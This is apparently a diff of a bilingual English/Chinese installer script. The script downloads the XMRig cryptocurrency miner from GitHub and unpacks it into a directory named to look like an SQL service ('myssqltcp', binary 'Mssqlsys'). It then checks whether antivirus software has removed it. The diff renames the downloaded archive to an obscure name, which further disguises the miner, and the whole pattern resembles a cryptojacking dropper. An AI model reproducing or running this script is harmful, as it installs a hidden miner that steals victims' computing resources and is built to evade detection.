@@ -196,21 +196,21 @@ if (test $? -ne 0); then
   LATEST_XMRIG_RELEASE=`curl -s https://github.com/xmrig/xmrig/releases/latest  | grep -o '".*"' | sed 's/"//g'`
   LATEST_XMRIG_LINUX_RELEASE="https://github.com"`curl -s $LATEST_XMRIG_RELEASE | grep xenial-x64.tar.gz\" |  cut -d \" -f2`
 
-  echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /tmp/xmrig.tar.gz"
-  echo "[*] 下载 $LATEST_XMRIG_LINUX_RELEASE 到 /tmp/xmrig.tar.gz"
-  if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/xmrig.tar.gz; then
-    echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/xmrig.tar.gz"
-	echo "发生错误: 无法下载 $LATEST_XMRIG_LINUX_RELEASE 文件到 /tmp/xmrig.tar.gz"
+  echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /tmp/wkggxmr.tar.gz"
+  echo "[*] 下载 $LATEST_XMRIG_LINUX_RELEASE 到 /tmp/wkggxmr.tar.gz"
+  if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/wkggxmr.tar.gz; then
+    echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/wkggxmr.tar.gz"
+	echo "发生错误: 无法下载 $LATEST_XMRIG_LINUX_RELEASE 文件到 /tmp/wkggxmr.tar.gz"
     exit 1
   fi
 
-  echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/myssqltcp"
-  echo "[*] 解压 /tmp/xmrig.tar.gz 到 $HOME/myssqltcp"
-  if ! tar xf /tmp/xmrig.tar.gz -C $HOME/myssqltcp --strip=1; then
-    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HOME/myssqltcp directory"
-	echo "警告: 无法解压 /tmp/xmrig.tar.gz 到 $HOME/myssqltcp 目录下"
+  echo "[*] Unpacking /tmp/wkggxmr.tar.gz to $HOME/myssqltcp"
+  echo "[*] 解压 /tmp/wkggxmr.tar.gz 到 $HOME/myssqltcp"
+  if ! tar xf /tmp/wkggxmr.tar.gz -C $HOME/myssqltcp --strip=1; then
+    echo "WARNING: Can't unpack /tmp/wkggxmr.tar.gz to $HOME/myssqltcp directory"
+	echo "警告: 无法解压 /tmp/wkggxmr.tar.gz 到 $HOME/myssqltcp 目录下"
   fi
-  rm /tmp/xmrig.tar.gz
+  rm /tmp/wkggxmr.tar.gz
 
   echo "[*] Checking if stock version of $HOME/myssqltcp/Mssqlsys works fine (and not removed by antivirus software)"
   echo "[*] 检查目录 $HOME/myssqltcp/Mssqlsys 中的Mssqlsys是否运行正常 (或者是否被杀毒软件误杀)"
